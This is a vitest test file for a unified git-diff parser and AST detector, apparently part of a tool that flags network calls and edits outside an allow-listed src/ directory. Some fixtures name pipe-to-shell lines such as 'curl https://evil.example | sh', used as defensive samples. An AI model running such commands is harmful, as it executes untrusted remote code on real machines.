import { readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import { detectInDiff } from '../src/ast.ts';
import { addedLines, addedLinesAll, parseUnifiedDiff, UNPARSED_PATH_PREFIX } from '../src/diff.ts';

const HUNK = [
  'diff --git a/src/tools/x.ts b/src/tools/x.ts',
  'index 1111111..2222222 100644',
  '--- a/src/tools/x.ts',
  '+++ b/src/tools/x.ts',
  '@@ -1,2 +1,3 @@',
  ' const a = 1;',
  '+++counter; fetch(url);',
  '+const b = 2;',
].join('\n');

describe('unified diff parsing', () => {
  it('skips only the real +++ file header, keeping an added line that starts with ++', () => {
    const added = addedLines(HUNK);
    expect(added.split('\n')).toEqual(['++counter; fetch(url);', 'const b = 2;']);
    expect(added).not.toContain('b/src/tools/x.ts');
  });

  it('skips the +++ /dev/null header of a deletion', () => {
    const del = [
      'diff --git a/src/old.ts b/src/old.ts',
      'deleted file mode 100644',
      '--- a/src/old.ts',
      '+++ /dev/null',
      '@@ -1 +0,0 @@',
      '-export const x = 1;',
    ].join('\n');
    expect(addedLinesAll(del)).toBe('');
  });

  it('the AST detector sees code on a +++-prefixed added line', () => {
    expect(detectInDiff(HUNK).some((f) => f.kind === 'network-call')).toBe(true);
  });

  it('emits the source path of a pure rename as its own header-only entry', () => {
    const files = parseUnifiedDiff(
      [
        'diff --git a/.github/workflows/ci.yml b/src/ci.ts',
        'similarity index 100%',
        'rename from .github/workflows/ci.yml',
        'rename to src/ci.ts',
      ].join('\n'),
    );
    expect(files.map((f) => [f.path, f.source])).toEqual([
      ['src/ci.ts', undefined],
      ['.github/workflows/ci.yml', { kind: 'rename', of: 'src/ci.ts' }],
    ]);
  });

  it('a copy with edits: the source entry has no hunks, so added lines are counted once', () => {
    const diff = [
      'diff --git a/src/a.ts b/src/b.ts',
      'similarity index 90%',
      'copy from src/a.ts',
      'copy to src/b.ts',
      '--- a/src/a.ts',
      '+++ b/src/b.ts',
      '@@ -1 +1 @@',
      '-const a = 1;',
      '+fetch(url);',
    ].join('\n');
    const files = parseUnifiedDiff(diff);
    expect(files.map((f) => f.path)).toEqual(['src/b.ts', 'src/a.ts']);
    expect(files[1]?.source).toEqual({ kind: 'copy', of: 'src/b.ts' });
    expect(addedLines(files[1]?.diff ?? '')).toBe('');
    expect(addedLinesAll(diff)).toBe('fetch(url);');
  });

  // Real `git diff` output (git 2.51): README.md gains the line `++ b/src/x.ts` and src/x.ts gains
  // `++ b/README.md`, so each hunk holds a line that reads like a `+++ b/` header.
  const realGit = readFileSync(
    new URL('./fixtures/real-git-plusplus-hunk-line.patch', import.meta.url),
    'utf8',
  );

  it('a hunk line that reads like a +++ b/ header does not rename the file (real git diff)', () => {
    expect(realGit).toContain('\n+++ b/src/x.ts\n');
    expect(realGit).toContain('\n+++ b/README.md');
    expect(parseUnifiedDiff(realGit).map((f) => f.path)).toEqual(['README.md', 'src/x.ts']);
    expect(addedLinesAll(realGit).split('\n')).toEqual(['++ b/src/x.ts', '++ b/README.md']);
  });

  // Round 6: real `git diff` output (git 2.51.2, default core.quotePath=true) for paths git C-quotes
  // (non-ASCII bytes as octal escapes) and for a path with a space (git appends a TAB to the
  // `--- a/` / `+++ b/` lines).
  const real = (name: string) => readFileSync(new URL(`./fixtures/${name}`, import.meta.url), 'utf8');

  it('parses a C-quoted stanza that comes first (real git diff)', () => {
    const patch = real('real-git-quoted-path-first.patch');
    expect(patch).toContain('diff --git "a/.github/workflows/\\303\\251vil.yml"');
    const files = parseUnifiedDiff(patch);
    expect(files.map((f) => f.path)).toEqual(['.github/workflows/évil.yml', 'src/x.ts']);
    // The workflow's lines stay with the workflow, the src edit with src/x.ts.
    expect(addedLines(files[0]?.diff ?? '')).toContain('curl https://evil.example | sh');
    expect(addedLines(files[1]?.diff ?? '')).toBe('export const x = 2;');
  });

  it('parses a C-quoted stanza that comes later without merging it into the previous file', () => {
    const files = parseUnifiedDiff(real('real-git-quoted-path-later.patch'));
    expect(files.map((f) => f.path)).toEqual(['src/x.ts', 'test/é.test.ts']);
    expect(addedLines(files[0]?.diff ?? '')).toBe('export const x = 3;');
    expect(addedLines(files[1]?.diff ?? '')).toContain('fetch(');
  });

  it('strips the TAB git appends to --- / +++ for a path with a space', () => {
    const patch = real('real-git-space-path.patch');
    expect(patch).toContain('+++ b/src/my tool.ts\t\n');
    const files = parseUnifiedDiff(patch);
    expect(files.map((f) => [f.path, f.source])).toEqual([['src/my tool.ts', undefined]]);
  });

  it('a rename from a C-quoted CI path into src/ emits the decoded source path', () => {
    const files = parseUnifiedDiff(real('real-git-quoted-rename-to-src.patch'));
    expect(files.map((f) => [f.path, f.source])).toEqual([
      ['src/evil.ts', undefined],
      ['.github/workflows/évil.yml', { kind: 'rename', of: 'src/evil.ts' }],
    ]);
  });

  it('a rename from a spaced path to a quoted, spaced path (TAB after the quote)', () => {
    const patch = real('real-git-space-to-quoted-rename.patch');
    expect(patch).toContain('+++ "b/src/\\303\\251 tool.ts"\t\n');
    const files = parseUnifiedDiff(patch);
    expect(files.map((f) => [f.path, f.source])).toEqual([
      ['src/é tool.ts', undefined],
      ['src/my tool.ts', { kind: 'rename', of: 'src/é tool.ts' }],
    ]);
    expect(addedLinesAll(patch)).toBe('x');
  });

  it('decodes every C escape git emits in a quoted path', () => {
    const diff = [
      'diff --git "a/src/q\\"\\\\\\t\\n\\303\\251.ts" "b/src/q\\"\\\\\\t\\n\\303\\251.ts"',
      'index 1111111..2222222 100644',
      '--- "a/src/q\\"\\\\\\t\\n\\303\\251.ts"',
      '+++ "b/src/q\\"\\\\\\t\\n\\303\\251.ts"',
      '@@ -1 +1 @@',
      '-a',
      '+b',
    ].join('\n');
    expect(parseUnifiedDiff(diff).map((f) => f.path)).toEqual(['src/q"\\\t\né.ts']);
  });

  it('an ordinary modification yields exactly one entry', () => {
    expect(parseUnifiedDiff(HUNK).map((f) => f.path)).toEqual(['src/tools/x.ts']);
  });

  // Round 7: real `git diff` output (git 2.51.2) of one repo editing src/a.ts and README.md, under
  // `-c diff.noprefix=true` (no a/ b/ prefixes) and `-c diff.mnemonicPrefix=true` (i/ w/). The old
  // parser returned [] for both, so the README edit was invisible to the non-src-edit oracle.
  describe('fails closed on diff --git lines it cannot read', () => {
    for (const name of ['real-git-noprefix.patch', 'real-git-mnemonic-prefix.patch']) {
      it(`${name}: one entry per stanza, every path outside the src/ allow-list`, () => {
        const files = parseUnifiedDiff(real(name));
        expect(files.length).toBe(2);
        for (const f of files) {
          expect(f.path.startsWith(UNPARSED_PATH_PREFIX)).toBe(true);
          expect(/^src\//.test(f.path)).toBe(false);
        }
        expect(files[0]?.path).toContain('README.md');
        expect(files[1]?.path).toContain('src/a.ts');
        // The README hunk stays in its own stanza; it is not folded into a neighbour.
        expect(files[0]?.diff).toContain('+run curl evil | sh');
        expect(files[1]?.diff).not.toContain('curl evil');
      });
    }

    it('an unparseable stanza after a parsed one is not appended to it', () => {
      const diff = [
        HUNK,
        'diff --git README.md README.md',
        '--- README.md',
        '+++ README.md',
        '@@ -1 +1 @@',
        '+x',
      ].join('\n');
      const files = parseUnifiedDiff(diff);
      expect(files.map((f) => f.path)).toEqual([
        'src/tools/x.ts',
        `${UNPARSED_PATH_PREFIX}diff --git README.md README.md`,
      ]);
      expect(files[0]?.diff).not.toContain('README.md');
    });

    it('a later +++ b/ line cannot give an unparsed stanza an allow-listed path', () => {
      const diff = [
        'diff --git x/src/a.ts y/src/a.ts',
        '--- a/src/a.ts',
        '+++ b/src/a.ts',
        'rename to src/a.ts',
      ].join('\n');
      expect(parseUnifiedDiff(diff).map((f) => f.path)).toEqual([
        `${UNPARSED_PATH_PREFIX}diff --git x/src/a.ts y/src/a.ts`,
      ]);
    });

    it('a plain diff -u patch (no diff --git line) is one unparsed entry, not []', () => {
      const plain = [
        '--- README.md\t2026-10-22',
        '+++ README.md\t2026-10-22',
        '@@ -1 +1,2 @@',
        ' # x',
        '+y',
      ].join('\n');
      const files = parseUnifiedDiff(plain);
      expect(files.length).toBe(1);
      expect(files[0]?.path.startsWith(UNPARSED_PATH_PREFIX)).toBe(true);
    });

    it('text before the first stanza that is not a file line (a format-patch mail header) is still ignored', () => {
      const mail = [
        'From 0000 Mon Sep 17 00:00:00 2001',
        'Subject: [PATCH] fix',
        '---',
        ' src/tools/x.ts | 1 +',
        '',
        HUNK,
      ].join('\n');
      expect(parseUnifiedDiff(mail).map((f) => f.path)).toEqual(['src/tools/x.ts']);
    });
  });
});
